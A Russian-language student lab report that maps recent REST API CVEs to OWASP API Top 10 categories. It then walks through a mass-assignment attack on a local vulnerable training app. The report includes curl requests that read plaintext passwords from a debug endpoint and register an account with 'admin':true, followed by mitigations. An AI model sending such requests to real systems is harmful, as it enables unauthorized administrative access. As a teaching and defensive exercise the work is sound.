ЛР 3. Симуляция атаки по уязвимостям OWASP Top 10 REST API

Часть I. CVE за последний год, связанные с REST API и OWASP API Top 10

В качестве основы для классификации использовался OWASP API Security Top 10 2023.

1) CVE-2025-67259 — ClassroomIO v0.1.13

Источник: https://nvd.nist.gov/vuln/detail/CVE-2025-67259

Компонент: ClassroomIO — приложение/платформа для управления учебными курсами. В уязвимой версии используется REST/PostgREST endpoint /rest/v1/course.

Суть недостатка: Аутентифицированный пользователь с низкими правами, например student, может получить не предназначенную ему информацию о курсах, других студентах, профилях преподавателей/администраторов и внутренние метаданные курса.

Причина: Недостаточная проверка прав доступа на уровне объекта. Сервер доверяет параметрам API-запроса и не проверяет, имеет ли конкретный пользователь право читать конкретный объект курса.

Классификация OWASP API Top 10: API1:2023 — Broken Object Level Authorization.

2) CVE-2025-10611 — WSO2 Products

Источник: https://nvd.nist.gov/vuln/detail/CVE-2025-10611

Компонент: WSO2 Products — набор корпоративных продуктов для API management, интеграции и identity/access management.

Суть недостатка: Из-за недостаточной реализации контроля доступа в некоторых REST API можно обойти проверки аутентификации и авторизации. Успешная эксплуатация может привести к административному доступу и выполнению неавторизованных административных операций.

Причина: На уровне REST API некорректно применяются проверки authentication/authorization. В результате endpoint может быть вызван без должной валидации прав.

Классификация OWASP API Top 10: API2:2023 — Broken Authentication.

3) CVE-2025-9209 — RestroPress WordPress plugin

Источник: https://nvd.nist.gov/vuln/detail/CVE-2025-9209

Компонент: RestroPress — WordPress-плагин для онлайн-заказа еды. Использует REST API WordPress, включая endpoint /wp-json/wp/v2/users.

Суть недостатка: В версиях 3.0.0–3.1.9.2 плагин раскрывает private tokens и API-данные через REST API endpoint. Это позволяет неаутентифицированному атакующему подделывать JWT-токены других пользователей, включая администраторов, и входить от их имени.

Причина: Чувствительные данные пользователя доступны через API без достаточной фильтрации и защиты.

Классификация OWASP API Top 10: API2:2023 — Broken Authentication.

Часть II. Симуляция атаки на локальном стенде

1. Запуск стенда

Выполнил команды:

docker pull ket9/otus-devsecops-owasp-rest docker run -d -p 8080:8080 ket9/otus-devsecops-owasp-rest:latest

После запуска открыл приложение:

http://localhost:8080/

На главной странице приложение показало доступные endpoint'ы:

{ "создать базу": "/createdb", "посмотреть информацию обо всех пользователях": "/users/v1", "посмотреть подробную информацию обо всех пользователях": "/users/v1/_debug", "регистрация нового пользователя": "/users/v1/register (HTTP POST)", "вход в приложение": "/users/v1/login (HTTP POST)", "просмотр пользователя по имени": "/users/v1/{username}", "удалить пользователя по имени (только для админов)": "/users/v1/{username} (HTTP DELETE)", "изменить email пользователя": "/users/v1/{username}/email (HTTP PUT)", "изменить пароль пользователя": "/users/v1/{username}/password (HTTP PUT)", "все книги": "/books/v1", "добавить книгу": "/books/v1 (HTTP POST)", "просмотр книги": "/books/v1/{book}" }

2. Наполнение базы

Перешел по адресу:

http://localhost:8080/createdb

Ответ приложения:

{ "message": "Database populated." }

Вывод: база заполнена тестовыми пользователями и книгами, можно проверять работу API.

3. Первичная проверка пользователей

Выполнил GET-запрос:

curl http://localhost:8080/users/v1

Ответ приложения:

{ "users": [ {"email":"mail1@mail.com","username":"name1"}, {"email":"mail2@mail.com","username":"name2"}, {"email":"admin@mail.com","username":"admin"} ] }

Вывод: обычный endpoint возвращает список пользователей и email. Пароли и роли в этом ответе не отображаются.

4. Проверка debug-endpoint

Выполнил GET-запрос:

curl http://localhost:8080/users/v1/_debug

Ответ приложения:

{ "users": [ {"admin":false,"email":"mail1@mail.com","password":"pass1","username":"name1"}, {"admin":false,"email":"mail2@mail.com","password":"pass2","username":"name2"}, {"admin":true,"email":"admin@mail.com","password":"pass1","username":"admin"} ] }

Вывод: Endpoint /users/v1/_debug раскрывает внутренние свойства пользователя:

  • password;
  • admin;
  • полный список пользователей.

Это уже является недостатком: API возвращает чувствительные поля, которые не должны быть доступны клиенту. Также из ответа стало понятно, что у пользователя есть скрытое поле admin.

5. Регистрация обычного пользователя

Сначала проверил, какие поля нужны для регистрации.

Запрос без пароля:

curl -X POST http://localhost:8080/users/v1/register
-H "Content-Type: application/json"
-d '{"username":"user100","email":"user100@mail.com"}'

Ответ:

{ "status": "fail", "message": "'password' is a required property" }

Вывод: для регистрации обязательны как минимум username, email и password.

Затем отправил корректный запрос:

curl -X POST http://localhost:8080/users/v1/register
-H "Content-Type: application/json"
-d '{"username":"user100","password":"password100","email":"user100@mail.com"}'

Ответ:

{ "message": "Successfully registered. Login to receive an auth token.", "status": "success" }

Проверил через debug-endpoint:

curl http://localhost:8080/users/v1/_debug

Фрагмент ответа:

{"admin":false,"email":"user100@mail.com","password":"password100","username":"user100"}

Вывод: обычный пользователь создается с admin=false.

6. Симуляция атаки Mass Assignment

После просмотра debug-ответа стало понятно, что в модели пользователя есть поле admin. Я проверил, можно ли передать это поле при регистрации, хотя оно не должно задаваться клиентом.

Выполнил POST-запрос:

curl -X POST http://localhost:8080/users/v1/register
-H "Content-Type: application/json"
-d '{"username":"user101","password":"password101","email":"user101@mail.com","admin":true}'

Ответ приложения:

{ "message": "Successfully registered. Login to receive an auth token.", "status": "success" }

Затем повторно проверил debug-endpoint:

curl http://localhost:8080/users/v1/_debug

Фрагмент ответа:

{"admin":true,"email":"user101@mail.com","password":"password101","username":"user101"}

Вывод: Приложение приняло поле admin из пользовательского JSON и сохранило нового пользователя как администратора. Это означает, что сервер автоматически связывает входной JSON с внутренней моделью пользователя и не ограничивает список полей, которые разрешено задавать клиенту.

7. Описание найденной уязвимости

Найдена уязвимость Mass Assignment.

Суть: При регистрации пользователь может передать дополнительное поле admin=true. Приложение не отбрасывает это поле и не проверяет, имеет ли клиент право задавать административный признак. В результате обычный пользователь может создать учетную запись с правами администратора.

Почему это опасно:

  • пользователь получает повышенные права без разрешения администратора;
  • появляется возможность выполнять административные функции;
  • нарушается модель разграничения доступа;
  • при наличии endpoint'ов управления пользователями это может привести к удалению или изменению чужих учетных записей.

Дополнительно найден недостаток раскрытия чувствительных данных через /users/v1/_debug: endpoint возвращает пароли и служебное поле admin.

8. Тип уязвимости по OWASP API Top 10

Основной тип: API3:2023 — Broken Object Property Level Authorization.

Обоснование: В OWASP API Security Top 10 2023 в эту категорию входят проблемы, связанные с отсутствием или неправильной проверкой доступа на уровне свойств объекта. В данном случае клиент может управлять свойством admin, которое должно задаваться только сервером или администратором.

Связанные категории:

  • API5:2023 — Broken Function Level Authorization, потому что получение admin=true открывает доступ к функциям администратора;
  • API8:2023 — Security Misconfiguration, потому что debug-endpoint доступен на стенде без защиты и раскрывает внутренние данные.

9. Меры предотвращения

  1. Использовать белый список полей при регистрации

Для endpoint /users/v1/register сервер должен принимать только поля:

  • username;
  • email;
  • password.

Поле admin должно игнорироваться или приводить к ошибке 400 Bad Request.

Пример правильной логики:

  • если в JSON есть unknown field, например admin, вернуть ошибку;
  • не использовать автоматическое связывание всего JSON с внутренней моделью пользователя;
  • использовать отдельные DTO/схемы для входных данных.
  1. Запретить изменение служебных полей со стороны клиента

Поля вроде admin, role, is_staff, permissions, balance, owner_id должны назначаться только сервером. Клиент не должен иметь возможность передавать их в запросе регистрации или изменения профиля.

  1. Реализовать проверку авторизации на сервере

Даже если пользователь отправляет admin=true, сервер должен проверять:

  • кто выполняет операцию;
  • имеет ли он право назначать роли;
  • разрешено ли менять конкретное свойство объекта.
  1. Удалить или защитить debug-endpoint

Endpoint /users/v1/_debug не должен быть доступен пользователям. Его нужно:

  • удалить из production-сборки;
  • закрыть авторизацией;
  • ограничить доступом только из внутренней сети;
  • не возвращать пароли и служебные поля.
  1. Не хранить и не возвращать пароли в открытом виде

Пароли должны храниться только в виде криптографических хешей с солью, например bcrypt, scrypt или Argon2. API никогда не должен возвращать password в ответах.

  1. Добавить тесты безопасности

Нужно добавить проверки:

  • регистрация с admin=true не должна создавать администратора;
  • API не возвращает password;
  • обычный пользователь не может выполнять административные действия;
  • неизвестные поля в JSON отклоняются.

Итог

На локальном учебном стенде была найдена уязвимость Mass Assignment: через endpoint регистрации можно передать поле admin=true и создать пользователя с правами администратора.

Основная классификация: API3:2023 — Broken Object Property Level Authorization.

Дополнительно обнаружено раскрытие чувствительных данных через /users/v1/_debug, так как endpoint возвращает пароли и служебные поля пользователей.

Основная причина: отсутствие строгой схемы входных данных, автоматическое связывание пользовательского JSON с внутренней моделью и отсутствие проверки прав на изменение отдельных свойств объекта.
